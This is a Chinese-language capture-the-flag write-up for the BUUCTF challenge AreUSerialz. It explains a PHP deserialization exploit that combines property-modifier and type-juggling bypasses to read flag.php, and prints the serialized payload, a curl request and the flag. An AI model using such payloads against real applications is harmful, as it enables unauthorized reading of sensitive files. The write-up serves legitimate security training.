---
title: "[网鼎杯 2020 青龙组]AreUSerialz"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [php-deserialization, type-juggling, protected-property-bypass]
vulnerability: PHP 反序列化漏洞配合类型绕过
solved: true
flag: "flag{2a0d84f2-8d71-4298-b003-0c3e89dc4847}"
---

# [网鼎杯 2020 青龙组]AreUSerialz

## 题目概述
题目提供了一个 PHP 页面，包含一个 `FileHandler` 类，通过 GET 参数 `str` 接收序列化字符串并反序列化。目标是利用反序列化漏洞读取 `flag.php` 文件内容。

## 信息收集
访问页面直接显示源码，关键结构：
- `FileHandler` 类有 `protected` 属性：`$op`, `$filename`, `$content`
- `__destruct()` 在对象销毁时调用 `process()`
- `process()` 根据 `$op` 值执行 `write()` 或 `read()`
- `read()` 使用 `file_get_contents()` 读取 `$filename`
- `is_valid()` 函数限制序列化字符串只能包含 ASCII 32-125（可打印字符）

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞类型**：PHP 反序列化 + 类型绕过 + 属性访问修饰符绕过

**原理分析**：
1. **protected 属性绕过**：protected 属性序列化后带有 `\x00*\x00` 前缀（含 NULL 字符），会被 `is_valid()` 拒绝。但 PHP 7.1+ 对序列化字符串的属性访问修饰符解析宽松，将 `protected` 改为 `public`（去掉 `\x00*\x00`）仍能正常反序列化。

2. **类型绕过绕过 __destruct 检查**：
```php
if($this->op === "2")  // 严格比较
    $this->op = "1";
```
使用整数 `2` 而非字符串 `"2"`，因为 `2 === "2"` 为 false，不会触发重置。

3. **弱类型比较进入 read()**：
```php
if($this->op == "2")  // 松散比较，2 == "2" 为 true
```
整数 `2` 与字符串 `"2"` 松散比较相等，成功进入 `read()` 分支。

## 利用过程（Payload + Flag）

**Payload 构造**：
```php
class FileHandler {
    public $op = 2;           // 整数绕过 === 检查
    public $filename = "flag.php";
    public $content;          // 可为空
}
```

**序列化结果**：
```
O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}
```

**URL 编码后发送**：
```bash
curl "http://target/?str=O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A7%3A%22content%22%3BN%3B%7D"
```

**返回结果**：
```
[Result]: <br><?php $flag='flag{2a0d84f2-8d71-4298-b003-0c3e89dc4847}';
```

## 复现步骤
1. 访问题目页面获取源码
2. 分析类结构和魔术方法调用链
3. 识别 protected 属性限制和 is_valid() 字符过滤
4. 利用 PHP 7.1+ 属性修饰符宽松解析，改用 public 属性
5. 利用 PHP 弱类型特性，用整数 2 绕过严格比较
6. 构造序列化 payload，设置 filename 为 flag.php
7. 发送请求获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| PHP 反序列化 | GET 参数 str | `O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}` | protected→public 绕过、类型绕过 |
| 类型混淆 | __destruct 严格比较 | 整数 2 vs 字符串 "2" | PHP 弱类型比较特性 |

## 知识总结（解题技巧、同类题型套路）

**解题技巧**：
- 看到 `is_valid()` 字符过滤时，优先考虑属性修饰符绕过
- 遇到 `===` 严格比较阻挡时，检查是否有 `==` 松散比较入口，利用类型差异绕过
- PHP 反序列化题目重点关注 `__destruct` 和 `__wakeup` 魔术方法

**同类题型套路**：
- protected/private 属性序列化含特殊字符 → 改用 public 或字符串拼接绕过
- 严格比较阻挡 → 寻找松散比较入口，利用类型差异
- `__wakeup` 阻挡 → CVE-2016-7124 属性数绕过（PHP < 7.0.10）
- 反序列化入口 + 文件读取函数 → 构造恶意对象读取敏感文件
